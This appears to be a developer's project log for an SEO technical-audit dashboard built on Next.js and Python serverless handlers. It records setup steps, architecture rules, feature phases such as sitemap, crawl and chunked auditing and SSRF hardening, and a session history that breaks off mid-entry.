# PROJECT_LOG - SEO Technical Audit Dashboard

> **Last updated:** 2026-07-15 · **Session:** 21 · **Version:** v0.17.0 (pre-release)
> Master log, read in full before touching code. Mirrors the format of the
> SEO Suite project's `PROJECT_LOG.md` (60-second resume, Do NOT, Current
> State, Phases, Session History).

---

## 60-Second Resume

```
1. cd "C:\Users\Surya L\Desktop\AI Agents\seo-audit-dashboard"
2. npm install
3. python -m venv .venv && .venv\Scripts\activate   # bash: source .venv/Scripts/activate
4. pip install -r requirements-dev.txt
5. npm run dev            # frontend only: /api/*.py 404s under plain `next dev`
6. vercel dev            # full stack incl. Python api/*.py handlers
7. python -m pytest tests/ -q      # 23 tests green as of v0.2.0
```

Architecture in one line: **Next.js 16 + Tailwind 4 frontend, Python
`api/*.py` serverless handlers (Vercel runtime, 60s cap), NO database, NO
server state: audit results persist client-side in localStorage only.**

---

## Do NOT

- **Do NOT** copy SEO Suite's server-side audit orchestration verbatim. It
  relies on a long-lived Flask process (daemon thread + SSE + on-disk
  checkpointing to `data/`). This app is stateless serverless: there is no
  long-lived process, no writable disk, no SSE-capable endpoint. Sitewide
  crawls MUST be **client-orchestrated** (browser fans out single-URL calls).
- **Do NOT** run a whole sitemap crawl inside one `api/*.py` invocation. The
  Vercel function cap is 60s (`vercel.json`). One invocation = one URL.
- **Do NOT** run domain-level site-health checks (WHOIS, DNS/SPF/DMARC/MX,
  SSL, robots.txt, sitemap, www-redirect, HTTP/2) once per page in a sitewide
  audit; they are identical for every page on the domain. Compute once per
  domain, reuse across pages. (See Phase 2 optimization.)
- **Do NOT** let `modules/scoring.py` `WEIGHTS`/`THEMES` drift from
  `lib/scoring.ts`/`lib/aggregate.ts`; mirror both in the same commit.
- **Do NOT** re-add an X-Robots-Tag `noindex` issue in `analyze_indexability`.
  It's owned by `advanced_checks.py::analyze_http_headers` (double-count bug).
- **Do NOT** persist any API key server-side. Keys live in localStorage and
  are passed per-request (PSI, Groq pattern).
- **Do NOT** push without: lint clean, `pytest` green, secret scan, no broken
  imports. Commit freely; never push unless explicitly told.

---

## Current State

### Stack
- Frontend: Next.js 16, React 19, Tailwind CSS 4, Recharts
- Backend: Python 3, `http.server.BaseHTTPRequestHandler` handlers under `api/`
- State: localStorage only (`lib/state/AuditContext.tsx`), no DB

### Audit engine: what exists
- `modules/auditor.py::audit_url()`: full single-URL audit (metadata,
  headings, canonical, indexability, url_structure, content, images, advanced,
  site_health, links, page-type-specific, PSI optional). Accepts
  `prefetched=None` to reuse a page already fetched by a caller (e.g.
  `modules/crawler.py`) instead of re-fetching it.
- `modules/auditor.py::audit_urls_bulk()`: ThreadPoolExecutor(8) bulk runner
  **(EXISTS but UNWIRED, no API route calls it)**. Bulk audits in this app go
  through the client orchestrator (one `/api/audit` call per URL) instead.
- `modules/technical_checks.py::analyze_site_health()`: domain-level checks
  (concurrent). `check_sitemap()` extracts `<loc>` URLs internally **but
  discards them (returns only `url_count`)**; `modules/sitemap_extractor.py`
  is the module that actually returns the extracted URLs.
- `modules/sitemap_extractor.py` + `api/sitemap.py`: sitemap/sitemap-index
  URL extraction (depth cap 5, gzip support, SSRF-validated, dedup, cap/filter).
- `modules/crawler.py` + `api/crawl.py`: BFS link-discovery crawl (no sitemap
  needed), discovery-only in this app (`run_full_audit=False`).
- `modules/technical_audit_checklist.py`: 35-check pass/warn/fail checklist
  (crawlability/on_page/site_health), rendered on the detail page's
  "Technical Audit" tab.

### UI: what exists
- Sidebar shell (`components/AppShell.tsx`), light/dark theme, conic-gradient
  score circles, pill badges (v0.2.0 SEO-Suite-style rebuild, done). Nav has no
  placeholder pages left; `/tools` and `/link-graph` were removed in Phase 0.
- Pages: dashboard, `technical-audit` (Single URL / Sitemap / Crawl-from-URL /
  CSV-Paste, 4 input modes, all bulk-ready), results (N-result table +
  sitewide rollup card), detail (incl. the Technical Audit checklist tab),
  links, headings, performance, export (bulk-aware), settings.
- `lib/checklistDefs.ts`, `components/HelpDialog.tsx`,
  `components/ChecklistExplainer.tsx`, `lib/useSelectedChecks.ts` +
  `components/CheckSelector.tsx`: the plain-English explainer card, per-section
  help popovers, and the check-selection ("Customize checks") panel on the
  Technical Audit page, added in Phase 1h.

### Gaps for the multi-input Technical Audit (as scoped in Session 3, closed across Sessions 4-6)
1. ~~No sitemap **URL extraction** endpoint~~ -> `modules/sitemap_extractor.py` + `api/sitemap.py` (Session 4).
2. ~~No sitemap-index recursion, no gzip support~~ -> both handled (depth cap 5, cycle guard) (Session 4).
3. ~~No CSV parsing~~ -> `lib/crawl/parseUrlList.ts` (client-side, no upload) (Session 4).
4. ~~`AuditContext.addResult` is single-only~~ -> `addResults(results[])` added (Session 4).
5. ~~single-URL input only~~ -> `/technical-audit` now has Single URL / Sitemap / Crawl-from-URL / CSV-Paste modes (Session 4 + 5).
6. ~~No client-side crawl orchestrator~~ -> `lib/crawl/orchestrator.ts::runCrawl` (bounded concurrency + progress + cancel) (Session 4).

All 6 original gaps are closed. Phase 2 (sitewide site-health dedup) shipped
in Session 11; see the session row for the domain/page split and client-side
prefetch.

### Test target
`https://www.edstellar.com/sitemap.xml`: flat `<urlset>`, **2,461 URLs**,
490 KB. Confirms need for a URL cap (default sample) + domain-level dedup.

---

## Reference research (2026-07-14)

Popular technical-SEO crawlers surveyed for input-mode + concurrency patterns:
- [Open SEO Crawler](https://github.com/puneetindersingh/open-seo-crawler):
  self-hosted Screaming Frog alt: **5 concurrent workers default (1-20)**,
  0.4s per-host politeness delay, **1,500-page default cap (up to 5,000)**,
  sitemap cross-check, live-refresh summary dashboard, XLSX export.
- [StanGirard/seo-audits-toolkit](https://github.com/StanGirard/seo-audits-toolkit):
  sitemap URL extractor + Lighthouse/security-header crawler.
- [sethblack/python-seo-analyzer](https://github.com/sethblack/python-seo-analyzer):
  sitemap-seeded or homepage-BFS crawl.
- Screaming Frog (free tier = 500-URL cap) and Sitebulb (severity-scored
  "Hints" + plain-language verdicts): the commercial bar for UX/reporting.

SEO Suite's own model (reference, NOT to copy wholesale): 5 input types
(Sitemap / Crawl-from-URL / CSV-Excel / Paste URLs / Screaming Frog CSV),
limit 1–500 (default 10), workers 1–8 (default 3), crawl depth 1–4,
`ThreadPoolExecutor` + SSE progress + on-disk checkpoint every 25 URLs.

---

## Order of Execution (Phases)

### PHASE 0 - Nav restructure  ✅ COMPLETE (v0.3.0)
- Renamed **New Audit → Technical Audit**, moved `/new-audit` → `/technical-audit`.
- Removed **Quick Tools** and **Link Graph** placeholder pages + nav entries.
- Added a collapsible **"Additional Tools"** sidebar section (Heading Analysis
  + Export Reports), collapse state persists in localStorage, auto-expands
  if it contains the active route.

### PHASE 1 - Multi-input Technical Audit  ✅ COMPLETE (v0.3.0)
Client-orchestrated (browser fans out `/api/audit` calls, see agents.md
"Sitewide/bulk audit architecture"). Three input modes shipped: **Single URL
· Sitemap · CSV/Paste URL list.**

- **1a. Sitemap extraction**: `modules/sitemap_extractor.py` + `api/sitemap.py`.
  Recurses `<sitemapindex>` (depth cap 5, cycle guard), gzip support,
  SSRF-validates every hop, dedupes, include/exclude regex, URL cap (50
  default / 200 max). 9 unit tests + 1 live test (edstellar.com, 2,461 URLs
  found), all passing.
- **1b. CSV/paste parsing**: `lib/crawl/parseUrlList.ts`, fully client-side.
  Detects url/link header column or scrapes http(s) cells; CSV/TSV/plain
  paste. 11 Vitest unit tests passing.
- **1c/1d. Orchestrator + batched state**: `lib/crawl/orchestrator.ts::runCrawl`
  (bounded concurrency 5 default/10 max, abort support) + `AuditContext.addResults()`.
- **1e. Technical Audit page**: `app/technical-audit/page.tsx`: mode selector,
  per-mode fields, bulk options (limit, concurrency), live progress bar +
  succeeded/failed counts + cancel, routes to `/results` on completion.
- **1f. Sitewide rollup**: `app/results/page.tsx` gains a summary card (avg
  score circle, score distribution, top failing checks) when 2+ results present.

**Verification:** `/api/*.py` only runs under `vercel dev`, which needs
interactive account linking (hangs headless), so verification split two ways:
(1) real Python-level pipeline test against Edstellar (`test_sitewide_pipeline_live.py`,
sitemap resolved, 3 real pages audited, valid scores + 35-check checklists,
34.6s), and (2) `window.fetch` mocked in-browser to verify the full client
orchestrator/UI end-to-end (mode switch, progress bar, cancel, batched
persistence, rollup card, results table), confirmed working via screenshots.

### PHASE 1g - Crawl-from-URL (4th input mode)  ✅ COMPLETE (v0.4.0)
User pointed at a fetched-but-unmerged remote branch, `origin/venkataramana-work`
(`git fetch origin venkataramana-work`, **do not delete this branch**), which
contained `modules/crawler.py` (BFS link-discovery crawl, Phase 1 of its own
`phases.md` roadmap for a fuller async job-queue crawl architecture; phases
2-6 of that roadmap are NOT built here, just the Phase 1 crawler module) plus
`tests/test_crawler.py` and a small `audit_url(..., prefetched=None)` addition
to `modules/auditor.py` (avoids a duplicate fetch when the caller already has
the page). All copied over and verified working unmodified (11/11 existing
tests pass against our current codebase).

Adapted the API boundary to fit our client-orchestrated architecture: the
branch's `crawl_site()` supports `run_full_audit=True` (synchronous per-page
audit_url() calls inside the crawl loop, risks the 60s Vercel cap at the
default max_pages=50), but `api/crawl.py` always calls it with
`run_full_audit=False`, discovery only, same `{urls, total_found, capped}`
contract shape as `api/sitemap.py`. Per-page auditing happens through the
existing `lib/crawl/orchestrator.ts`, exactly like sitemap/CSV mode.

Added to `app/technical-audit/page.tsx` as "Crawl from URL" (4th mode, 4-column
grid): start URL, include/exclude regex, max depth (1-10), robots.txt handling
(respect/ignore/ignore_but_report), include-subdomains toggle, shared bulk
options (limit/concurrency). New unit test (`test_discovery_only_mode_skips_per_page_audit`)
+ opt-in live test (`test_live_edstellar_discovery_crawl`, 10 real pages
discovered via BFS in ~4s). Verified end-to-end in-browser via mocked
`window.fetch` (mode select → 6/6 crawled + audited → results).

### PHASE 1h - Help dialogs + check-selection UI  ✅ COMPLETE (v0.5.0)
User shared a screenshot of the reference tool's "Technical SEO" use-case
page (explainer card with all 35 checks as pills, a "when to use" note, and
an example output) and asked for (a) plain-English help dialogs per section,
and (b) letting users choose which checks to run, "similar to SEO Suite's
use case but keep all as default."

- `lib/checklistDefs.ts`: frontend mirror of the 35 check ids/labels/groups
  (must stay in sync with `modules/technical_audit_checklist.py`), each with
  a one-sentence plain-English description. Guarded by
  `lib/checklistDefs.test.ts` (35 total, 12/11/12 group split, unique ids).
- `components/HelpDialog.tsx`: reusable "ⓘ" popover (click to open, closes
  on outside-click/Escape).
- `components/ChecklistExplainer.tsx`: the "What Technical SEO checks" card,
  mirroring the reference tool's explainer: description, all 35 checks as
  pills, "when to use" callout. Added below the audit form on the Technical
  Audit page, collapsed by default so it doesn't push the form below the fold.
- Help dialogs added to: each of the 4 input-mode cards (Single URL/Sitemap/
  Crawl/CSV) with a longer plain-English "when to use this mode" explanation,
  and each of the 3 checklist groups (Crawlability/On-Page/Site Health) on
  the detail page's Technical Audit tab.
- `lib/useSelectedChecks.ts` + `components/CheckSelector.tsx`: a collapsible
  "Customize checks (N/35 selected)" panel with per-check checkboxes grouped
  by category, select-all/none, indeterminate group checkboxes, persisted to
  localStorage. **All 35 selected by default**, per the user's explicit
  instruction. Deselecting a check hides it from the detail page's Technical
  Audit checklist tab; it is a **display filter only**, the backend still
  computes all 35 checks in one `audit_url()` call regardless (they're bundled
  into a single page fetch, so skipping individual checks server-side
  wouldn't meaningfully speed anything up, this is stated explicitly in the
  UI so the distinction isn't misleading).
- Detail page's Technical Audit tab now shows "N of 35 checks shown" + a
  "N check(s) hidden. Adjust in Technical Audit -> Customize checks." hint
  when the selection excludes anything, and an empty state if everything is
  deselected.

Verified end-to-end in-browser: explainer card renders with all 35 pills,
help popovers open/close correctly (mode cards + checklist groups), check
deselection updates counts live and persists across reload, and the detail
page correctly hides deselected checks from each group with an accurate
shown/hidden count. 15 vitest (added `checklistDefs.test.ts`) + 44 pytest
(unchanged) all green; one real `react/no-unescaped-entities` lint issue
introduced was found and fixed before commit.

### PHASE 2 - Sitewide efficiency  ⏳ PLANNED  *(after Phase 1 works)*
- Add `skip_site_health` param to `audit_url()`. In sitewide mode, run
  domain-level `analyze_site_health()` **once**, then per-page audits reuse
  that cached block. Cuts redundant WHOIS/DNS/SSL/robots/sitemap/HTTP2 calls
  from N× to 1× per domain, a major latency + politeness win on a 2,461-URL
  site. Checklist merges the shared site_health block per result for display.

### PHASE 3 - Auditing sites with 200+ URLs  ✅ COMPLETE (v0.8.0, option 2)

User picked **option 2, chunked runs**. Implemented in
`lib/crawl/chunkedRunner.ts`: splits a resolved URL list into fixed
`CHUNK_SIZE=200` batches (still wraps the existing bounded-concurrency
`lib/crawl/orchestrator.ts`, unchanged), auto-advancing from one chunk to
the next with no user interaction required as long as the tab stays open,
and persisting a lightweight resumable checkpoint (remaining URLs +
cumulative succeeded/failed counts, not full audit results, those still
flow through `AuditContext`/IndexedDB as before) after every single
completed URL, not just at chunk boundaries. If the tab closes or crashes
mid-run, reopening the Technical Audit page shows an "Interrupted audit
found: X of Y done" banner with Resume/Discard.

Raised `MAX_URL_CAP` in `modules/sitemap_extractor.py` from 200 to 2000
(sitemap resolution is just an XML fetch/parse, cheap even at that size);
kept `api/crawl.py`'s `MAX_MAX_PAGES` at 200 since BFS crawl discovery does
a real per-page HTTP GET to extract links, a genuinely more expensive
server-side operation than a sitemap fetch. The Technical Audit page's
"URL limit" field now shows a mode-dependent max (2000 for sitemap/CSV, 200
for crawl) and clamps down automatically (derived, not synced via a
`useEffect`, to avoid a `react-hooks/set-state-in-effect` lint violation)
if the user switches from sitemap to crawl mode with a higher limit set.

Found and fixed a real bug during manual testing: the first draft reset
`succeeded`/`failed` counts to 0 on every resume instead of carrying them
forward, so a paused-then-resumed run's final tally only reflected the
last session, not the cumulative total. Fixed by storing `succeeded`/
`failed` in the checkpoint itself and threading them through
`runChunked`'s optional `resumeFrom` parameter.

Added `vitest.config.ts` (a `@/*` path alias matching `tsconfig.json`,
needed because plain Vitest doesn't resolve Next.js's path aliases) and 6
new tests in `lib/crawl/chunkedRunner.test.ts` (chunk-count arithmetic,
checkpoint persistence/clearing, abort-leaves-a-resumable-checkpoint, and
the succeeded/failed-carries-across-resume regression test). Verified
manually end-to-end in-browser with a mocked, artificially slow
(250ms/request) 60-URL run: paused mid-chunk at 54/60, reloaded (simulating
a closed tab), saw the resume banner, resumed, and confirmed the final
tally (48 ok + 12 failed = 60/60) was the correct cumulative total, not
just the resumed session's count.

**Why the 200-URL cap exists today:** `MAX_URL_CAP` in `modules/sitemap_extractor.py`
and `api/crawl.py` (200) isn't a hard technical limit, it's a judgment call
matched to the current **client-orchestrated** design: the browser
(`lib/crawl/orchestrator.ts`) fans out single-URL `/api/audit` calls at
bounded concurrency (5 default/10 max) and the tab must stay open and
connected for the whole run. At ~2-5s per audit and concurrency 5, 200 URLs
takes roughly 1.5-4 minutes of the user actively keeping the tab open with a
stable connection. That's reasonable for 200; it stops being reasonable at
1,000+ (10-30+ minutes, one dropped connection loses the whole in-flight
batch, no resume). IndexedDB storage itself is not the constraint: a
synthetic 200-result, ~28MB payload saved and loaded without issue in
testing (see Session 8 verification below), IndexedDB's quota is a share of
free disk space, far larger than localStorage's ~5-10MB.

**Options evaluated:**

1. **Just raise the cap** (e.g. 200 → 1000). Zero new code, but doesn't fix
   the underlying problem, it just moves the "tab must stay open 30+ minutes
   with no resume" pain to a bigger number. Fine as a cheap stopgap, not a
   real fix.
2. **Chunked/multiple runs** (client-side). Auto-split a large URL list into
   sequential batches (e.g. 200 at a time), surfacing a "Batch 2 of 5, continue?"
   prompt between chunks. No backend changes, works within today's
   architecture, and each chunk still respects the 60s/invocation Vercel cap.
   Doesn't require the tab to run unattended, but doesn't provide
   true "start it and walk away" either, the user still has to be present to
   advance each chunk (though this could be automated with a client-side
   timer that just keeps calling the next chunk without user interaction, as
   long as the tab stays open).
3. **PR #1's SQLite job-queue** (`modules/job_store.py`,
   `api/crawl/{start,step,status}.py`). Poll-driven, resumable, and each
   `step` call is bounded so it never risks the 60s cap by itself. **BUT**:
   `SQLiteJobStore`'s own docstring says on-disk SQLite is NOT guaranteed to
   survive between calls on Vercel's ephemeral serverless containers, it's
   explicitly built as a swappable interface with a real Postgres store as
   the intended production backend, and that Postgres implementation was
   never written in the PR. As-is, this architecture would NOT reliably work
   in production on Vercel; it needs a real hosted database (e.g. Neon or
   Supabase free tier via `DATABASE_URL`) to actually deliver on its
   resumable/background promise.
4. **GitHub Actions as a fully decoupled batch runner.** A
   `workflow_dispatch`-triggered Action (inputs: sitemap/seed URL, limit)
   runs a Python script that reuses `modules/auditor.py`/`sitemap_extractor.py`/
   `crawler.py` directly (no Vercel timeout at all, GitHub-hosted runners get
   up to 6 hours), writes the aggregated result as a JSON artifact (or
   commits it to a `reports/` location, or uploads to a GitHub Release).
   Genuinely solves "browser doesn't need to stay open" and "no timeout,"
   at the cost of a less-integrated UX: the user triggers the run outside
   the app (GitHub UI or `gh workflow run`), waits for it to finish, then
   imports the resulting JSON into the dashboard (would need a new "Import
   results" feature, not just an export one). Good fit for scheduled/
   recurring full-site audits; a poor fit for "audit this URL right now and
   watch it happen" style tasks.

**Recommendation:** short-term, option 2 (chunked runs) is the best
value, it needs no new infrastructure, no new dependency, and directly
extends the orchestrator already built and tested. Long-term, if truly
unattended/background large-site audits become a real need, option 3
(finish PR #1's design with a real Postgres store) is the more integrated
answer and option 4 (GitHub Actions) is the better fit for scheduled batch
reporting. Not implementing any of this until the user picks a direction,
this is a real architecture decision, not a mechanical fix.

### PHASE C (trimmed) - API integrations  ⏳ MOSTLY N/A
User directive: "add only what's needed for THIS tool." A technical audit is
**no-API by definition** (SEO Suite's own tagline: "35 checks, no API key
required"). PageSpeed Insights (`PSI_API_KEY`) is already integrated and is
the only external API a technical audit uses. **Net new API work for this
tool: none.** GSC/Moz/DataForSEO/SerpAPI/Bing/IndexNow belong to separate
use cases (authority/rank/indexing) and stay deferred.

### PHASE B - Standalone Quick Tools  ⏸ PAUSED (user directive)
Redirect tracer, header inspector, keyword density, code-to-text ratio,
compression check, robots.txt tester, duplicate-content detector,
structured-data coverage, internal link graph. Parked; do not build until
explicitly unpaused.

---

## Testing plan (Phase 1 acceptance)

1. **Unit**: `tests/test_sitemap_extractor.py`: flat urlset, sitemap-index
   recursion, gzip, cycle guard, cap/filter, SSRF rejection (mocked HTTP).
2. **Unit**: CSV/paste parser (url-column detect, http-cell scrape, junk
   rejection).
3. **Live smoke**: extract `https://www.edstellar.com/sitemap.xml`, assert
   ~2,461 URLs found; run a capped sample (limit 25) through the orchestrator
   in the browser; verify progress, N results in `/results`, rollup card, and
   the Technical Audit checklist tab on a drilled-down URL.
4. **Regression**: existing 23 tests stay green; lint clean; `tsc --noEmit`.

---

## Decisions (signed off 2026-07-14)

1. **Route:** move `New Audit` → **`/technical-audit`** (update nav + links). ✅
2. **Link Graph nav:** **remove** the placeholder from nav (Phase B paused). ✅
3. **Sitewide cap:** **50 URLs default / 200 max** (browser-orchestrated). ✅
4. **Concurrency:** **5 default / 10 max** (matches Open SEO Crawler). ✅
5. **Build order:** Phase 0 (nav) → Phase 1 (multi-input audit) → live-test on
   Edstellar. Approved to start. ✅

---

## Session History

| Session | Date | Version | Key Work |
| --- | --- | --- | --- |
| 1 | 2026-07 | v0.1.0 | Merged Next.js SEO audit dashboard (base) + ported Streamlit site-health checks & Groq AI summary. |
| 2 | 2026-07-14 | v0.2.0 | SEO-Suite-style UI rebuild (indigo/violet gradient, dark sidebar, light/dark toggle, conic score circles, pill badges, mobile drawer). Technical SEO Audit use-case parity: `technical_audit_checklist.py` (35-check pass/warn/fail view) + `check_https_enforcement` + X-Robots-Tag nofollow; new detail "Technical Audit" tab; pytest harness + 23 tests; `agents.md` updated. |
| 3 | 2026-07-14 | v0.2.0 | Research + this PROJECT_LOG. Scoped multi-input Technical Audit (single/sitemap/CSV), nav restructure, trimmed Phase C. Confirmed client-orchestrated architecture (serverless + localStorage constraint). Probed Edstellar sitemap (2,461 URLs). Plan signed off (route→`/technical-audit`, cap 50/200, concurrency 5/10, remove Link Graph nav). Pushed UI rebuild + Technical Audit checklist commits to `origin/main`. |
| 4 | 2026-07-14 | v0.3.0 | **Phase 0+1 shipped.** Nav restructure (Technical Audit rename/route move, collapsible Additional Tools section, removed Quick Tools/Link Graph). Multi-input Technical Audit: sitemap extractor (index recursion, gzip, SSRF-safe) + `api/sitemap.py`, client CSV/paste parser, bounded-concurrency crawl orchestrator, batched `addResults`, 3-mode input UI with live progress, sitewide rollup card. Added Vitest for frontend unit tests (11 passing) alongside pytest (32 passing, 2 live tests opt-in). Verified end-to-end: real pipeline test against edstellar.com/sitemap.xml (2,461 URLs resolved, 3 real pages audited) + mocked-fetch in-browser UI walkthrough (mode switch → progress → results → rollup, all screenshotted). Pushed both commits to `origin/main`. |
| 5 | 2026-07-14 | v0.4.0 | Made "Additional Tools" nav section collapsible (persisted, auto-expands on active route). **Phase 1g: Crawl-from-URL.** User pointed at unmerged remote branch `origin/venkataramana-work` (fetched, not deleted), which contained a well-tested BFS `modules/crawler.py` (`CrawlConfig`/`crawl_site`, seed selection, scope control, UA presets, 3 robots.txt modes) + `tests/test_crawler.py` + a small `prefetched` param on `audit_url()`. Adopted the crawler module as-is (11/11 tests pass unmodified); adapted the API boundary to our client-orchestrated model: `api/crawl.py` always runs discovery-only (`run_full_audit=False`), never the branch's synchronous per-page-audit mode, to stay under the 60s cap. Added as 4th Technical Audit input mode. New/live tests added and passing (44 pytest total, 3 opt-in skipped, 11 vitest). Verified end-to-end via mocked-fetch in-browser walkthrough. Branch also has a `phases.md` roadmap (async job queue, JS rendering, site scoring, dedicated crawl UI) for future phases, not built yet. |
| 6 | 2026-07-14 | v0.5.0 | **Phase 1h: Help dialogs + check-selection UI.** User shared a screenshot of the reference tool's "Technical SEO" use-case explainer and asked for plain-English help dialogs plus a check-selection UI (default all on). Added `lib/checklistDefs.ts` (frontend mirror of the 35 check ids/labels/groups + one-sentence descriptions, guarded by a new test), `components/HelpDialog.tsx` (reusable popover), `components/ChecklistExplainer.tsx` (the "What Technical SEO checks" card with all 35 pills + "when to use", rendered below the audit form and collapsed by default), and `lib/useSelectedChecks.ts` + `components/CheckSelector.tsx` (a "Customize checks (N/35 selected)" panel, all on by default, persisted to localStorage). Help dialogs added to each of the 4 input-mode cards and each of the 3 checklist groups on the detail page; the detail page's Technical Audit tab now filters displayed checks by the user's selection (explicitly a display filter: the backend still computes all 35 checks every audit, since they're free once the page is fetched). 15 vitest + 44 pytest green; one real lint issue (unescaped apostrophes) found and fixed. Verified end-to-end in-browser via mocked state (explainer render, help popover open/close, check deselection + persistence, detail-page filtering with an accurate hidden-count message). |
| 7 | 2026-07-14 | v0.6.0 | **UI polish, reporting gap fix, docs accuracy, and a full em-dash removal.** Moved `ChecklistExplainer` below the audit form (matching the user's screenshot) and collapsed it by default. Discovered PR #1 (`venkataramana-d`, still open) implements the FULL `venkataramana-work` roadmap (SQLite job queue, Playwright JS rendering, site scoring, a separate `/crawl` UI), overlapping/conflicting with the simpler discovery-only `api/crawl.py` already shipped; user decided to leave PR #1 untouched for now (not merged, not closed). Fixed 4 hardcoded `bg-white` inputs/selects (settings, performance, headings, detail pages) that broke dark mode, plus themed the dashboard's Recharts tooltips (`contentStyle`/`labelStyle` with CSS variables instead of Recharts' white default). Dispatched 5 parallel agents across 2 rounds for non-overlapping file sets: (1) UI content quality + em-dash removal across `app/`/`components/` except export, (2) reporting/export improvements, closing a real gap where the 35-check checklist was completely absent from CSV/Excel/PDF exports (now a checklist column/sheet/summary line in every format, `tests/test_report_generator.py` added), (3) `agents.md`/`PROJECT_LOG.md` accuracy audit (found and fixed a stale "Current State" section from Session 3/4), (4) em-dash sweep for the remaining Python modules/tests, (5) em-dash sweep for remaining `lib/*.ts` files + README. Total: 164 additional em-dashes removed across the whole codebase (zero remain anywhere in `app/`, `components/`, `lib/`, `modules/`, `api/`, `tests/`, or `*.md`). Final verification: 51 pytest passed (3 opt-in live skipped), 15 vitest passed, `tsc --noEmit` clean, lint at the exact pre-existing 27-error baseline (no new errors), secret scan clean across all 51 changed/new files. |
| 8 | 2026-07-14 | v0.7.0 | **Critical fix: localStorage QuotaExceededError.** Every state change was writing the WHOLE results array as one JSON blob to localStorage (~5-10MB quota); a 200-URL bulk audit routinely exceeded it and crashed. Root-caused and fixed by migrating persistence to IndexedDB (`lib/state/idbStore.ts`, a minimal raw wrapper, no new dependency), with one-time migration of existing localStorage data and a defensive prune-to-500-most-recent fallback plus a user-visible warning banner if a save ever still fails. Verified with a synthetic 200-result, ~28MB payload saved and loaded successfully through the real `AuditContext` (would have crashed instantly under the old localStorage path). Extracted the sidebar's dark-mode logic into a shared `lib/useTheme.ts` hook (pub-sub so multiple mounted toggles stay in sync) and added a second toggle on the Settings page ("Appearance" card), per the user's choice to keep dark mode with an explicit Settings control rather than removing it. Changed the font from Inter to Arial (`--font-sans`, dropped the Google Fonts import). Researched and wrote a Phase 3 plan (`PROJECT_LOG.md`) for auditing 200+ URL sites: confirmed PR #1's SQLite job-queue does NOT reliably persist on Vercel's ephemeral containers by its own docstring (needs a real Postgres store, never built in that PR), and laid out 4 options (raise the cap, chunked runs, finish PR #1 with Postgres, GitHub Actions batch runner) with a recommendation (chunked runs short-term); no implementation yet, pending user direction. |
| 9 | 2026-07-14 | v0.8.0 | **Phase 3 shipped: chunked runs.** User picked option 2 from the prior session's plan. Added `lib/crawl/chunkedRunner.ts` (`CHUNK_SIZE=200`, wraps the existing orchestrator unchanged, persists a resumable checkpoint of remaining URLs + cumulative succeeded/failed after every result), a resume/discard banner on the Technical Audit page, and a "Batch X of Y" progress indicator. Raised `modules/sitemap_extractor.py`'s `MAX_URL_CAP` 200 to 2000 (cheap XML fetch); kept `api/crawl.py`'s cap at 200 since BFS discovery is a real per-page fetch. Added `vitest.config.ts` (path alias, needed for the new lib to resolve `@/` imports under plain Vitest) and 6 new tests. Found and fixed a real bug via manual testing: succeeded/failed counts reset to 0 on resume instead of carrying forward; fixed by storing them in the checkpoint and threading through a `resumeFrom` param, verified with a live paused-then-resumed run (48 ok + 12 failed = 60/60 cumulative, correct). Also fixed a new `react-hooks/set-state-in-effect` violation introduced by an early draft (mode-dependent limit clamping) by deriving the clamped value instead of syncing it via `useEffect`; lint stayed at the 25-error baseline. 26 vitest + 51 pytest green, `tsc --noEmit` clean. |
| 10 | 2026-07-14 | v0.9.0 | **Closed PR #1, whole-project audit + fixes, Technical-tab wiring overhaul.** Closed PR #1 (kept the branch) with an explanation: its SQLite job-queue won't persist on Vercel's ephemeral containers and the intended Postgres store was never built, and chunked runs already deliver sitewide auditing. Ran two audit agents (a UI-wiring map of `audit_url()` output vs. what pages render, and a full security/correctness/dead-code audit). **Security (critical):** hardened `validate_audit_url` to DNS-resolve hostnames and reject any that resolve to private/reserved IPs; added `safe_get()` (manual per-hop redirect re-validation) used by `fetch_page`; added SSRF guards to `link_auditor.validate_url` (untrusted third-party link URLs) and `crawler._fetch_sitemap_locs` (attacker-controlled sitemap URLs), all previously fetched with no or insufficient validation. **Correctness:** dropped the legacy `images` block from `all_issues` (double-counted alt-text issues vs. `image_detail`'s "Image SEO" ones) and added "Image SEO" to the Images theme in `scoring.py` + `aggregate.ts` (were falling into "Other"). **Wiring/UI:** replaced the detail Technical tab's raw key-value dump with structured cards (Core Web Vitals, security headers, structured data, a rendered Open Graph social preview, site-health breakdown, hreflang table, redirect chain), which surfaced ~7 previously-orphaned `advanced`/`site_health` sub-objects. Colour-coded the Overview score-breakdown bars. Added `tests/test_ssrf.py` (17) + `tests/test_scoring.py` (12). 80 pytest (3 opt-in live skipped, both re-run green against real redirects) + 26 vitest, tsc clean, lint at baseline. **Residual audit findings NOT yet actioned** (tracked for later): (1) redirect-target re-validation in `technical_checks.py` cross-host followers (H1, lower severity since the initial host is always the already-validated audit domain); (2) N+1 domain-level site_health running per-page in a same-domain crawl (P1 = the planned Phase 2 memoization); (3) triple HTML re-parse per page (P2); (4) `course_audit`/`blog_audit` data still issues-only, not shown in a page-type panel; (5) `audit_urls_bulk` still dead code; (6) no tests yet for `link_auditor`/`advanced_checks`/`mobile_auditor`/`image_auditor`/`linkify` escaping. |
| 11 | 2026-07-14 | v0.10.0 | **Phase 2 (site-health memoization) + Results/Detail section merge.** Phase 2: closed the N+1 site-health finding by splitting `technical_checks.analyze_site_health` into `analyze_domain_health(url)` (8 domain-wide checks: robots/sitemap/domain-age/SSL/https-enforcement/DNS/www-redirect/HTTP2) and `_analyze_page_health(...)` (readability/freshness/canonical-loop), with `analyze_site_health(..., prefetched_domain_health=None)` reusing a prefetched domain result. New `api/site-health.py` (`maxDuration` 30 in `vercel.json`) returns domain health per host; `lib/crawl/siteHealthCache.ts` (`fetchDomainHealth`, one call per unique host, CONCURRENCY 5, null-on-failure) prefetches once and the orchestrator injects `prefetchedDomainHealth` per URL, so a 200-page same-domain crawl runs the domain checks once instead of 200x. `audit.py`/`auditor.py` thread the param through. Since the backend is client-orchestrated (no shared server memory), memoization is client-driven. Verified: 1 site-health call for 12 same-domain URLs. Tests: `tests/test_site_health_memoization.py` (3) + `lib/crawl/siteHealthCache.test.ts` (5). **Section merge:** folded the standalone `links`, `headings`, and `performance` pages into `app/detail/page.tsx` as tabs, extracted verbatim into `components/detail/{LinksView,HeadingsView,PerformanceView}.tsx`; deleted the 3 old page files (~1900 lines). `app/results/page.tsx` now groups rows by domain (collapsible, worst-avg first) with richer columns (URL/score/checklist pass-warn-fail/top-issue/View) and routes into the detail via `setSelectedUrlIndex` + `router.push("/detail")`; the detail gets a "Back to results" link. Nav dropped 8 to 5 items (`resolveActiveHref` in `AppShell.tsx` highlights "Results" on `/detail`). Verified in-browser with seeded IndexedDB state: domain-grouped list, all 9 detail tabs (incl. Links/Headings/Performance 